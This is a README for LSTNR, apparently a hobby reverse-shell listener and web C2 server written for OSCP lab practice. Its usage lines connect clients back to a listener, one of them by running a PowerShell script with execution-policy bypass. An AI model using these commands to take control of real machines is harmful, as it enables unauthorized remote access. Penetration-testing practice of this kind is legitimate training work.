# LSTNR
Python server that receives shell connections from remote devices. 

Remote devices can be managed from a Command Line Interface (CLI)

OR

Remote devices can be managed from the LSTNR webpage.

# DISCLAIMER
This is only for testing purposes, not intended for anything illegal. I was testing out ways to manage multiple connections while doing the OSCP labs. #Hobbies

# Web page - obsolete
<img width="1162" alt="Screenshot 2024-12-21 at 1 03 20 AM" src="https://github.com/user-attachments/assets/9145dc13-14d0-440c-9d00-9a60f547bbc5" />

# Download LSTNR

```git clone github.com/bwithe/LSNTR```

# USAGE: CLI
1. Start LSTNR
    - `python3 lstnr.py -p <PORT_TO_LISTEN>`

<img width="509" alt="Screenshot 2024-12-30 at 8 17 42 PM" src="https://github.com/user-attachments/assets/375e9059-e448-412c-8677-cac252d1da63" />

2. Have CLIENT connect to LSTNR
    - Linux / MacOS
      - `python3 client.py -p <LSTNR_SERVER_PORT> -s <LSTNR_SERVER_IP>`
      - `bash client.sh`
    - Windows
        - `powershell -ep bypass .\client.ps1 -p <LSTNR_SERVER_PORT> -s <LSTNR_SERVER_IP>`


# USAGE: Web C2 server 
1. Start the server
    - `python3 lstnr-web.py`

2. Open link in web browser
    - `firefox 127.0.0.1:8000`
